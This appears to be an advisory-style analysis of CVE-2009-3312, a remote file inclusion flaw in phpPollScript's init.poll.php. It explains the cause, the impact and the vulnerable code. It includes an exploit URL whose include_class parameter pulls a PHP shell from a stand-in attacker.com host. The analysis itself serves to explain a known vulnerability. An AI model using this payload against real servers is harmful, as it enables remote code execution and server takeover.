Based on the provided information, here's an analysis of CVE-2009-3312:

**Root Cause of Vulnerability:**

*   The vulnerability is due to a lack of proper input sanitization in the `init.poll.php` script of phpPollScript version 1.3 and earlier. Specifically, the `include_class` parameter is used to construct a file path for inclusion without proper validation.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is that the script directly uses user-supplied input (`include_class`) to construct a path for inclusion using `require`. This allows an attacker to include a malicious file from a remote server.
*  The code at `line 2 $inc_path = dirname($include_class);` and `line 3 require ($inc_path."/voting.poll.php");` is vulnerable.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file, an attacker can execute arbitrary code on the server hosting the vulnerable phpPollScript instance. This could lead to complete compromise of the server, data theft, defacement, or other malicious activities.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is exploited by sending an HTTP GET request to the vulnerable `init.poll.php` script with a crafted `include_class` parameter.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to have network access to the server hosting the vulnerable application.
*   **Malicious File Hosting:** The attacker needs to have a web server hosting the malicious file they wish to include.
*   **Basic Web Skills:** The attacker needs to be able to craft a URL with the vulnerable parameter.

**Technical Details:**

*   The vulnerable code is located in `init.poll.php`, specifically lines 2 and 3:
    ```php
    $inc_path = dirname($include_class);
    require ($inc_path."/voting.poll.php");
    ```
*   The exploit URL is:
    `http://target.com/[path]/php/init.poll.php?include_class=http://attacker.com/shell.txt/test/`
    Where:
        *   `target.com` is the vulnerable server.
        *   `[path]` is the path to the phpPollScript installation.
        *  `attacker.com/shell.txt` is a remote server controlled by the attacker hosting a malicious PHP script.
* The exploit works because  `dirname` will extract the path portion of the URL  `http://attacker.com/shell.txt/test/`, which will be `http://attacker.com/shell.txt`. The script then includes the remote file `voting.poll.php` located in the specified path, which because of the concatenation,  points to `http://attacker.com/shell.txt/voting.poll.php`  if the attacker creates a file with the name `voting.poll.php` in the directory pointed to by `http://attacker.com/shell.txt`, then arbitrary code can be executed.
